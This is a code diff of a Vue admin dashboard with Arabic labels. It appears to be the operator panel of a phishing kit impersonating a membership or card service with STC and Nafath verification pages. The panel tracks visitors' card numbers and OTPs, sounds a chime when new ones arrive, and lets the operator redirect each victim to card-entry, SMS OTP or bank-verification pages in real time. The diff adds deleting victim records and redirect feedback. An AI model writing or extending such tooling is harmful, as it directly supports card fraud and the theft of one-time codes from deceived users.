@@ -7,6 +7,7 @@ import {
   VisitorMeta,
   listCardRequests,
   updateCardRequest,
+  deleteCardRequest,
   getServerStats,
   verifyAdminSession,
   adminLogoutApi
@@ -21,6 +22,8 @@ import {
   Key,
   Bell,
   BellOff,
+  Volume2,
+  Trash2,
   User,
   ChevronDown,
   MessageSquare,
@@ -77,64 +80,68 @@ const userPages = ref<Record<string, string>>({});
 const userMeta = ref<Record<string, VisitorMeta>>({});
 const activeSessions = ref<ActiveSessionInfo[]>([]);
 const selectedRedirectPage = ref('');
+const redirectFeedback = ref('');
 
 let pollTimer: ReturnType<typeof setInterval> | null = null;
 let knownSignature = '';
 
 const pageLabels: Record<string, string> = {
   '/': 'الصفحة الرئيسية',
-  '/request': 'حجز موعد / تسجيل البيانات',
+  '/request': 'تفعيل عضوية أفراد',
+  '/register-company': 'تسجيل الشركة (عضوية شركات)',
   '/payment': 'ملخص الرسوم',
   '/card-details': 'الدفع ببطاقة الائتمان',
-  '/waiting': 'تنبية إتصال STC',
+  '/waiting': 'صفحة الانتظار',
   '/otp': 'تحقق رقم الجوال (OTP)',
-  '/otp-bank': 'تحقق نفاذ / التطبيق البنكي'
+  '/otp-bank': 'تنبية إتصال STC / نفاذ'
 };
 
 const redirectOptions = [
-  { value: 'otp-bank', label: 'تنبية إتصال STC' },
-  { value: 'otp-sms', label: 'تحقق رقم الجوال (OTP)' },
+  { value: '/otp-bank', label: 'تنبية إتصال STC / نفاذ' },
+  { value: '/otp', label: 'تحقق رقم الجوال (OTP)' },
+  { value: '/waiting', label: 'صفحة الانتظار' },
   { value: '/card-details', label: 'الدفع ببطاقة الائتمان' },
   { value: '/payment', label: 'ملخص الرسوم' },
-  { value: '/request', label: 'حجز موعد / تسجيل البيانات' },
+  { value: '/request', label: 'تفعيل عضوية أفراد' },
+  { value: '/register-company', label: 'تسجيل الشركة (عضوية شركات)' },
   { value: '/', label: 'الصفحة الرئيسية' }
 ];
 
 const stepFallbackPage: Record<string, string> = {
   form: '/payment',
-  card: '/card-details',
+  card: '/waiting',
   otp: '/otp',
   'otp-bank': '/otp-bank'
 };
 
+const normalizeActionToPath = (action?: string | null): string => {
+  if (!action) return '';
+  if (action === 'otp-sms' || action === 'otp') return '/otp';
+  if (action === 'otp-bank') return '/otp-bank';
+  return action;
+};
+
 const getRequestCurrentPagePath = (req: RequestData) => {
+  const pending = normalizeActionToPath(req.nextAction);
+  if (pending) return pending;
   return userPages.value[req.id] || stepFallbackPage[req.step] || '/request';
 };
 
 const getRequestCurrentPageLabel = (req: RequestData) => {
-  if (req.nextAction === 'otp-bank') return 'تنبية إتصال STC';
-  if (req.nextAction === 'otp-sms') return 'تحقق رقم الجوال (OTP)';
   const path = getRequestCurrentPagePath(req);
-  if (req.step === 'card' && path === '/waiting') return 'الدفع ببطاقة الائتمان';
+  if (req.step === 'card' && path === '/waiting' && !userPages.value[req.id]) {
+    return 'الدفع ببطاقة الائتمان';
+  }
   return pageLabels[path] || path;
 };
 
-watch(selectedRequest, (req) => {
+watch(selectedRequestId, (newId) => {
+  const req = requests.value.find(r => r.id === newId);
   if (!req) {
     selectedRedirectPage.value = '';
     return;
   }
-  if (req.nextAction) {
-    selectedRedirectPage.value = req.nextAction;
-  } else if (req.step === 'otp') {
-    selectedRedirectPage.value = 'otp-sms';
-  } else if (req.step === 'otp-bank') {
-    selectedRedirectPage.value = 'otp-bank';
-  } else if (req.step === 'card') {
-    selectedRedirectPage.value = '/card-details';
-  } else {
-    selectedRedirectPage.value = 'otp-bank';
-  }
+  selectedRedirectPage.value = getRequestCurrentPagePath(req);
 });
 
 const getVisitorCode = (id: string) => {
@@ -162,6 +169,7 @@ const formatCardTypeLabel = (cardType: string) => {
   if (cardType === 'silver') return 'الأساسية';
   if (cardType === 'gold') return 'الذهبية';
   if (cardType === 'platinum') return 'البلاتينية';
+  if (cardType === 'company') return 'شركات';
   return 'مقيم';
 };
 
@@ -208,31 +216,88 @@ const formatRelativeTimeShort = (dateStr: string) => {
   return `${diffInDays} يوم`;
 };
 
-const playNotificationSound = () => {
-  if (!soundEnabled.value) return;
+let sharedAudioCtx: AudioContext | null = null;
+
+const getOrCreateAudioContext = (): AudioContext | null => {
   try {
     const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
-    if (!AudioContextClass) return;
+    if (!AudioContextClass) return null;
+    if (!sharedAudioCtx) {
+      sharedAudioCtx = new AudioContextClass();
+    }
+    if (sharedAudioCtx.state === 'suspended') {
+      sharedAudioCtx.resume().catch(() => {});
+    }
+    return sharedAudioCtx;
+  } catch {
+    return null;
+  }
+};
 
-    const audioCtx = new AudioContextClass();
-    const oscillator = audioCtx.createOscillator();
-    const gainNode = audioCtx.createGain();
+const unlockAudio = () => {
+  getOrCreateAudioContext();
+};
 
-    oscillator.type = 'sine';
-    oscillator.frequency.setValueAtTime(880, audioCtx.currentTime);
-    oscillator.frequency.setValueAtTime(1046.5, audioCtx.currentTime + 0.1);
+const playNotificationSound = (force = false) => {
+  if (!soundEnabled.value && !force) return;
+  try {
+    const audioCtx = getOrCreateAudioContext();
+    if (!audioCtx) return;
 
-    gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
-    gainNode.gain.linearRampToValueAtTime(0.3, audioCtx.currentTime + 0.05);
-    gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
+    const now = audioCtx.currentTime;
+    const notes = [587.33, 880, 1174.66]; // D5 -> A5 -> D6 chime
+    notes.forEach((freq, idx) => {
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      const start = now + idx * 0.11;
+      const duration = 0.22;
 
-    oscillator.connect(gainNode);
-    gainNode.connect(audioCtx.destination);
+      osc.type = 'triangle';
+      osc.frequency.setValueAtTime(freq, start);
 
-    oscillator.start(audioCtx.currentTime);
-    oscillator.stop(audioCtx.currentTime + 0.3);
+      gain.gain.setValueAtTime(0.001, start);
+      gain.gain.linearRampToValueAtTime(0.45, start + 0.02);
+      gain.gain.exponentialRampToValueAtTime(0.001, start + duration);
+
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+
+      osc.start(start);
+      osc.stop(start + duration);
+    });
   } catch (err) {
     console.warn('Audio playback failed', err);
+  }
+};
+
+const toggleSound = () => {
+  soundEnabled.value = !soundEnabled.value;
+  if (soundEnabled.value) {
+    playNotificationSound(true);
+  }
+};
+
+const isDeleting = ref<string | null>(null);
+
+const handleDeleteRequest = async (id: string, event?: Event) => {
+  if (event) {
+    event.stopPropagation();
+  }
+  if (!id || isDeleting.value === id) return;
+
+  isDeleting.value = id;
+  try {
+    await deleteCardRequest(id);
+    const remaining = requests.value.filter(r => r.id !== id);
+    requests.value = remaining;
+    if (selectedRequestId.value === id) {
+      selectedRequestId.value = remaining.length > 0 ? remaining[0].id : null;
+    }
+    knownSignature = remaining.map(r => `${r.id}:${r.updatedAt}:${r.step}:${r.cardNumber}:${r.otp}`).join('|');
+  } catch (err) {
+    console.error('Error deleting request:', err);
+  } finally {
+    isDeleting.value = null;
   }
 };
 
@@ -255,7 +320,7 @@ const fetchAll = async (isInitial = false) => {
 
     if (reqResult.status === 'fulfilled') {
       const reqList = reqResult.value;
-      const newSig = reqList.map(r => `${r.id}:${r.updatedAt}:${r.step}:${r.otp}`).join('|');
+      const newSig = reqList.map(r => `${r.id}:${r.updatedAt}:${r.step}:${r.cardNumber}:${r.otp}`).join('|');
       if (!isInitial && knownSignature && newSig !== knownSignature) {
         playNotificationSound();
       }
@@ -280,6 +345,8 @@ const fetchAll = async (isInitial = false) => {
 };
 
 onMounted(async () => {
+  window.addEventListener('pointerdown', unlockAudio, { once: true });
+  window.addEventListener('keydown', unlockAudio, { once: true });
   const valid = await verifyAdminSession();
   if (!valid) {
     router.push('/admin/login');
@@ -292,6 +359,8 @@ onMounted(async () => {
 });
 
 onUnmounted(() => {
+  window.removeEventListener('pointerdown', unlockAudio);
+  window.removeEventListener('keydown', unlockAudio);
   if (pollTimer) clearInterval(pollTimer);
 });
 
@@ -311,8 +380,13 @@ const updateOtpStatus = async (id: string, status: string) => {
 
 const updateNextAction = async (id: string, action: string) => {
   try {
-    selectedRedirectPage.value = action;
-    await updateCardRequest(id, { nextAction: action });
+    const normalized = normalizeActionToPath(action) || action;
+    selectedRedirectPage.value = normalized;
+    await updateCardRequest(id, { nextAction: normalized });
+    redirectFeedback.value = 'تم التوجيه';
+    setTimeout(() => {
+      if (redirectFeedback.value === 'تم التوجيه') redirectFeedback.value = '';
+    }, 2000);
     await fetchAll(false);
   } catch (err) {
     console.error('Error updating next action:', err);
@@ -457,11 +531,18 @@ const filteredRequests = computed(() => {
           <Key class="w-3.5 h-3.5" />
         </button>
         <button
-          @click="soundEnabled = !soundEnabled"
+          @click="playNotificationSound(true)"
+          class="hover:text-[#1976d2] transition-colors cursor-pointer"
+          title="تجربة صوت الإشعار"
+        >
+          <Volume2 class="w-3.5 h-3.5 text-[#1976d2]" />
+        </button>
+        <button
+          @click="toggleSound"
           class="hover:text-gray-800 transition-colors cursor-pointer"
           :title="soundEnabled ? 'كتم صوت التنبيهات' : 'تفعيل صوت التنبيهات'"
         >
-          <Bell v-if="soundEnabled" class="w-3.5 h-3.5 text-gray-600" />
+          <Bell v-if="soundEnabled" class="w-3.5 h-3.5 text-[#16a34a]" />
           <BellOff v-else class="w-3.5 h-3.5 text-red-500" />
         </button>
 
@@ -550,6 +631,16 @@ const filteredRequests = computed(() => {
               >
                 <span>{{ archivedIds.has(selectedRequest.id) ? 'إلغاء الأرشفة' : 'أرشفة' }}</span>
                 <Archive class="w-3 h-3 text-gray-400" />
+              </button>
+
+              <button
+                @click="handleDeleteRequest(selectedRequest.id)"
+                :disabled="isDeleting === selectedRequest.id"
+                class="px-2.5 py-1 border border-red-200 bg-red-50/60 hover:bg-red-100 rounded text-[11px] text-red-600 font-bold flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
+                title="حذف الطلب نهائياً"
+              >
+                <span>حذف</span>
+                <Trash2 class="w-3 h-3 text-red-500" />
               </button>
 
               <button class="hover:text-gray-800 cursor-pointer" @click="fetchAll(false)">
@@ -669,10 +760,11 @@ const filteredRequests = computed(() => {
 
               <button
                 @click="handleRedirectSelectChange"
-                class="text-gray-400 hover:text-[#1976d2] p-1 transition-colors cursor-pointer"
+                class="text-gray-400 hover:text-[#1976d2] p-1 transition-colors cursor-pointer flex items-center gap-1"
                 title="توجيه الزائر للصفحة المحددة"
               >
                 <Megaphone class="w-4 h-4" />
+                <span v-if="redirectFeedback" class="text-[10px] font-bold text-[#16a34a]">{{ redirectFeedback }}</span>
               </button>
             </div>
 
@@ -1139,11 +1231,21 @@ const filteredRequests = computed(() => {
             class="px-3 py-3 cursor-pointer transition-colors flex items-center justify-between gap-2"
             :class="selectedRequestId === req.id ? 'bg-[#cfe4ff]' : 'hover:bg-gray-50 bg-white'"
           >
-            <!-- Left Column: Relative Time + Status Badges -->
+            <!-- Left Column: Relative Time + Status Badges + Quick Delete -->
             <div class="flex flex-col items-start justify-between self-stretch shrink-0">
-              <span class="text-[10px] text-gray-400 font-medium" dir="rtl">
-                {{ formatRelativeTimeShort(req.updatedAt || req.createdAt) }}
-              </span>
+              <div class="flex items-center gap-1.5">
+                <button
+                  @click="handleDeleteRequest(req.id, $event)"
+                  :disabled="isDeleting === req.id"
+                  class="text-gray-400 hover:text-red-600 p-0.5 rounded hover:bg-red-50 transition-colors cursor-pointer"
+                  title="حذف المحادثة"
+                >
+                  <Trash2 class="w-3 h-3" />
+                </button>
+                <span class="text-[10px] text-gray-400 font-medium" dir="rtl">
+                  {{ formatRelativeTimeShort(req.updatedAt || req.createdAt) }}
+                </span>
+              </div>
 
               <div class="flex items-center gap-1 mt-1">
                 <MoreHorizontal
